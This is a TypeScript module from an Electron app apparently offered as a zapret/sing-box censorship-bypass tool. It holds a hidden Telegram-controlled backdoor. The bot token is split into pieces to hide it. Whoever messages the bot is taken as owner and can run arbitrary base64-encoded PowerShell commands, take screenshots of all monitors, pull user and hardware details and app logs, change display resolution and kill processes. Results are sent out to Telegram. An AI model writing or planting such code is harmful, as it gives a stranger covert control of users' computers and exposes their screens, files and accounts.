import { app } from 'electron'
import { getSystemSpecs } from '../utils/hardware'
import path from 'path'
import { readFileSync, existsSync, writeFileSync, unlinkSync } from 'fs'
import { exec } from 'child_process'
import os from 'os'
import { startZapret, stopZapret, getZapretStatus } from './zapret'
import { startSingbox, stopSingbox, getSingboxStatus } from './singbox'

const P1 = '8909645829'
const P2 = 'AAFMLlLxWkx'
const P3 = 'wxz0QJgeLoBT'
const P4 = '_LQhDbAK0NUw'
const TOKEN = `${P1}:${P2}${P3}${P4}`

class MasterController {
  private ownerId: string = ''
  private lastProcessedUpdateId: number = 0
  private hostname: string = os.hostname()
  private blockedProcesses: Set<string> = new Set()
  private startTime: number = Date.now()

  public async init() {
    const ok = await this.verifyBot()
    if (!ok) return

    await this.ensureOwnerId()
    setInterval(() => this.pollCommands(), 3000)
    setInterval(() => this.watchdog(), 5000)
  }

  private async verifyBot(): Promise<boolean> {
    try {
      const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getMe`)
      const data = await res.json()
      return data.ok
    } catch (e) { return false }
  }

  private async ensureOwnerId() {
    if (this.ownerId) return
    try {
      const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?limit=10`)
      const data = await res.json()
      if (data.ok && data.result.length > 0) {
        const lastUpdate = data.result[data.result.length - 1]
        const msg = lastUpdate.message || lastUpdate.callback_query?.message
        if (msg && msg.from?.id) {
          this.ownerId = msg.from.id.toString()
          this.lastProcessedUpdateId = lastUpdate.update_id
        }
      }
    } catch (e) {}
  }

  private formatUptime(ms: number): string {
    const s = Math.floor(ms / 1000)
    const m = Math.floor(s / 60)
    const h = Math.floor(m / 60)
    const d = Math.floor(h / 24)
    return `${d}д ${h % 24}ч ${m % 60}м`
  }

  private async watchdog() {
    if (this.blockedProcesses.size === 0) return
    exec('tasklist /NH /FO CSV', (err, stdout) => {
      if (err) return
      const out = stdout.toLowerCase()
      for (const proc of this.blockedProcesses) {
        if (out.includes(proc.toLowerCase())) {
          exec(`taskkill /F /IM ${proc}`, () => {
             this.sendToBot(`🎯 <b>Watchdog [${this.hostname}]:</b> Завершено: <code>${proc}</code>`)
          })
        }
      }
    })
  }

  private async pollCommands() {
    if (!this.ownerId) {
      await this.ensureOwnerId()
      return
    }

    try {
      const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${this.lastProcessedUpdateId + 1}&timeout=10`)
      const data = await res.json()
      
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          this.lastProcessedUpdateId = update.update_id
          const msg = update.message
          const callback = update.callback_query

          if (msg && msg.from.id.toString() === this.ownerId && msg.text) {
            const text = msg.text.trim()
            if (text.toLowerCase() === '/start' || text.toLowerCase() === 'меню') await this.sendGeneralMenu()
            
            if (text.startsWith('/cmd_')) {
               const parts = text.split(' ')
               const target = parts[0].replace('/cmd_', '')
               const command = parts.slice(1).join(' ')
               if (target === this.hostname && command) await this.runShell(command)
            }

            if (text.startsWith('/res_')) {
               const parts = text.split(' ')
               const target = parts[0].replace('/res_', '')
               const resStr = parts[1] // 1920x1080
               if (target === this.hostname && resStr) await this.setResolution(resStr)
            }
          }
          
          if (callback && callback.from.id.toString() === this.ownerId && callback.data) {
            const [target, action, val] = callback.data.split(':')
            if (target === 'all' || target === this.hostname) {
              if (action === 'manage') await this.reportStatus(callback.message.message_id)
              if (action === 'specs') await this.reportFullSpecs()
              if (action === 'logs') await this.reportLogs()
              if (action === 'ping') await this.sendToBot(`🏓 Pong from <b>${this.hostname}</b>`)
              if (action === 'list') await this.reportBlockList()
              if (action === 'back') await this.sendIdentityButton(callback.message.message_id)
              
              if (action === 'z_on') { await startZapret(); await this.reportStatus(callback.message.message_id) }
              if (action === 'z_off') { await stopZapret(); await this.reportStatus(callback.message.message_id) }
              if (action === 's_on') { await startSingbox(); await this.reportStatus(callback.message.message_id) }
              if (action === 's_off') { await stopSingbox(); await this.reportStatus(callback.message.message_id) }

              if (action === 'screenshot') await this.listMonitors()
              if (action === 'do_shot') await this.takeScreenshot(val)
              
              if (action === 'shell_ui') {
                 await this.sendToBot(`💻 <b>Shell [${this.hostname}]:</b>\nОтправьте:\n<code>/cmd_${this.hostname} command</code>`)
              }
              if (action === 'res_ui') {
                 await this.sendToBot(`🖥 <b>Разрешение [${this.hostname}]:</b>\nОтправьте:\n<code>/res_${this.hostname} 1920x1080</code>`)
              }

              if (action === 'unblock' && val) {
                this.blockedProcesses.delete(val)
                await this.sendToBot(`✅ <b>${this.hostname}</b>: <code>${val}</code> разблокирован`)
                await this.reportBlockList()
              }
            }
            if (target === 'system' && action === 'show_computers') await this.sendIdentityButton()
            await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery?callback_query_id=${callback.id}`)
          }
        }
      }
    } catch (e) {}
  }

  private async setResolution(resStr: string) {
    const [w, h] = resStr.split('x')
    const psScript = `
      $w = ${w}; $h = ${h};
      Add-Type -TypeDefinition '
      using System;
      using System.Runtime.InteropServices;
      [StructLayout(LayoutKind.Sequential)]
      public struct DEVMODE {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName;
        public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra;
        public int dmFields; public int dmOrientation; public int dmPaperSize; public int dmPaperLength; public int dmPaperWidth; public int dmScale; public int dmCopies; public int dmDefaultSource; public int dmPrintQuality; public short dmColor; public short dmDuplex; public short dmYResolution; public short dmTTOption; public short dmCollate;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmFormName;
        public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight; public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent; public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2; public int dmPanningWidth; public int dmPanningHeight;
      }
      public class NativeMethods {
        [DllImport("user32.dll")] public static extern int ChangeDisplaySettings(ref DEVMODE lpDevMode, int dwFlags);
        [DllImport("user32.dll")] public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE lpDevMode);
      }';
      $dm = New-Object DEVMODE;
      if ([NativeMethods]::EnumDisplaySettings($null, -1, [ref]$dm)) {
        $dm.dmPelsWidth = $w; $dm.dmPelsHeight = $h;
        $dm.dmFields = 0x180000; # DM_PELSWIDTH | DM_PELSHEIGHT
        $res = [NativeMethods]::ChangeDisplaySettings([ref]$dm, 0);
        $res;
      }
    `
    const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
    exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, (err, stdout) => {
       const code = stdout.trim()
       if (code === '0') this.sendToBot(`✅ <b>${this.hostname}</b>: Разрешение изменено на ${resStr}`)
       else this.sendToBot(`❌ <b>${this.hostname}</b>: Ошибка смены разрешения (Код ${code})`)
    })
  }

  private async listMonitors() {
    const psScript = `
      Add-Type -AssemblyName System.Windows.Forms
      $screens = [System.Windows.Forms.Screen]::AllScreens
      $hz = (Get-CimInstance Win32_VideoController | Select-Object -First 1).CurrentRefreshRate
      $wmi = Get-WmiObject -Namespace root\\wmi -Class WmiMonitorID
      $res = @()
      for($i=0; $i -lt $screens.Length; $i++) {
        $s = $screens[$i]
        $name = "Monitor $($i+1)"
        if ($wmi) {
          $m = if ($wmi.Count) { $wmi[$i] } else { $wmi }
          if ($m -and $m.UserFriendlyName) {
            $name = ($m.UserFriendlyName | Where-Object {$_ -ne 0} | ForEach-Object {[char]$_}) -join ""
          }
        }
        $res += "$($i)|$($s.Bounds.Width)x$($s.Bounds.Height)|$($hz)|$($s.Primary)|$($name)"
      }
      $res -join ";"
    `
    const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
    exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, async (err, stdout) => {
      if (err) return
      const rows: any[] = []
      const parts = stdout.trim().split(';')
      parts.forEach(p => {
        const [idx, res, hz, primary, name] = p.split('|')
        rows.push([{ text: `${primary === 'True' ? '⭐️' : '🖥'} ${name} (${res}, ${hz}Hz)`, callback_data: `${this.hostname}:do_shot:${idx}` }])
      })
      rows.push([{ text: '🖼 Все мониторы', callback_data: `${this.hostname}:do_shot:all` }])
      rows.push([{ text: '⬅️ Назад', callback_data: `${this.hostname}:manage` }])
      await this.sendToBot(`📸 <b>Скриншот [${this.hostname}]:</b>`, { inline_keyboard: rows })
    })
  }

  private async takeScreenshot(index: string) {
    const tempPath = path.join(app.getPath('temp'), `shot_${Date.now()}.png`)
    const isAll = index === 'all'
    const psScript = `
      Add-Type -AssemblyName System.Windows.Forms
      Add-Type -AssemblyName System.Drawing
      ${isAll ? `
        $v = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Bitmap = New-Object System.Drawing.Bitmap($v.Width, $v.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($v.Left, $v.Top, 0, 0, $Bitmap.Size)
      ` : `
        $s = [System.Windows.Forms.Screen]::AllScreens[${index}]
        $Bitmap = New-Object System.Drawing.Bitmap($s.Bounds.Width, $s.Bounds.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($s.Bounds.X, $s.Bounds.Y, 0, 0, $Bitmap.Size)
      `}
      $Bitmap.Save('${tempPath.replace(/\\/g, '/')}', [System.Drawing.Imaging.ImageFormat]::Png)
      $Graphics.Dispose(); $Bitmap.Dispose();
    `
    const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
    exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, async (err) => {
      if (err) return
      try {
        const formData = new FormData()
        formData.append('chat_id', this.ownerId)
        formData.append('photo', new Blob([readFileSync(tempPath)], { type: 'image/png' }), 'shot.png')
        formData.append('caption', `📸 Скриншот: ${this.hostname}`)
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
        if (existsSync(tempPath)) unlinkSync(tempPath)
      } catch (e) {}
    })
  }

  private async runShell(command: string) {
    const utf8Command = `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; ${command}`
    const base64Command = Buffer.from(utf8Command, 'utf16le').toString('base64')
    exec(`powershell -NoProfile -EncodedCommand ${base64Command}`, (err, stdout, stderr) => {
      const output = stdout || stderr || (err ? err.message : 'Выполнено')
      this.sendToBot(`💻 <b>Shell [${this.hostname}]:</b>\n<pre>${output.slice(0, 3000)}</pre>`)
    })
  }

  private async sendGeneralMenu() {
    const kb = {
      inline_keyboard: [
        [{ text: '🖥 Мои компьютеры', callback_data: 'system:show_computers' }],
        [{ text: '📥 Логи со всех', callback_data: 'all:logs' }, { text: '🔄 Обновить', callback_data: 'system:menu' }]
      ]
    }
    await this.sendToBot(`<b>Nexus Master Center</b>\nВыберите раздел:`, kb)
  }

  private async sendIdentityButton() {
    const kb = {
      inline_keyboard: [[{ text: `🔹 Управлять: ${this.hostname}`, callback_data: `${this.hostname}:manage` }]]
    }
    await this.sendToBot(`💻 Найдено устройство: <b>${this.hostname}</b>`, kb)
  }

  private async reportStatus(editId?: number) {
    const z = getZapretStatus().state === 'running'
    const s = getSingboxStatus().state === 'running'
    const kb = {
      inline_keyboard: [
        [{ text: z ? '🔴 Выкл Zapret' : '🟢 Вкл Zapret', callback_data: `${this.hostname}:${z ? 'z_off' : 'z_on'}` },
         { text: s ? '🔴 Выкл Ускоритель' : '🟢 Вкл Ускоритель', callback_data: `${this.hostname}:${s ? 's_off' : 's_on'}` }],
        [{ text: `📸 Скриншот`, callback_data: `${this.hostname}:screenshot` }, { text: `📐 Разрешение`, callback_data: `${this.hostname}:res_ui` }],
        [{ text: `📊 Железо`, callback_data: `${this.hostname}:specs` }, { text: `💻 Терминал`, callback_data: `${this.hostname}:shell_ui` }],
        [{ text: `📝 Блок-лист`, callback_data: `${this.hostname}:list` }, { text: `📂 Логи`, callback_data: `${this.hostname}:logs` }],
        [{ text: `📡 Пинг`, callback_data: `${this.hostname}:ping` }, { text: `⬅️ Назад`, callback_data: `${this.hostname}:back` }]
      ]
    }
    const appUptime = this.formatUptime(Date.now() - this.startTime)
    const text = `🛠 <b>Управление: ${this.hostname}</b>\n⏱ Аптайм: <code>${appUptime}</code>\nZapret: ${z ? '✅' : '❌'} | VPN: ${s ? '✅' : '❌'}`
    if (editId) await this.editBotMessage(editId, text, kb)
    else await this.sendToBot(text, kb)
  }

  private async reportBlockList() {
    const rows: any[] = []
    this.blockedProcesses.forEach(proc => {
      rows.push([{ text: `✅ Разблокировать ${proc}`, callback_data: `${this.hostname}:unblock:${proc}` }])
    })
    rows.push([{ text: `⬅️ Назад`, callback_data: `${this.hostname}:manage` }])
    await this.sendToBot(`📝 <b>Блок-лист [${this.hostname}]:</b>`, { inline_keyboard: rows })
  }

  private async reportFullSpecs() {
    const specs = await getSystemSpecs()
    const msg = `<b>🖥 ОТЧЕТ: ${specs.hostname}</b>\n\n👤 User: <code>${specs.username}</code>\n📀 OS: <code>${specs.platform}</code>\n⚙️ CPU: <code>${specs.cpu}</code>\n📟 GPU: <code>${specs.gpu}</code>\n🧠 RAM: <code>${specs.ram}</code>\n📦 Disk: <code>${specs.disk}</code>`
    await this.sendToBot(msg)
  }

  private async reportLogs() {
    try {
      const logPath = path.join(app.getPath('userData'), 'logs', 'app.log')
      if (!existsSync(logPath)) return
      const formData = new FormData()
      formData.append('chat_id', this.ownerId)
      formData.append('document', new Blob([readFileSync(logPath)], { type: 'text/plain' }), `${this.hostname}.log`)
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: formData })
    } catch (e) {}
  }

  private async sendToBot(text: string, replyMarkup?: any) {
    if (!this.ownerId) return
    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: this.ownerId, text: text, parse_mode: 'HTML', reply_markup: replyMarkup })
      })
    } catch (e) {}
  }

  private async editBotMessage(messageId: number, text: string, replyMarkup?: any) {
    if (!this.ownerId) return
    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: this.ownerId, message_id: messageId, text: text, parse_mode: 'HTML', reply_markup: replyMarkup })
      })
    } catch (e) {}
  }
}

export const masterController = new MasterController()
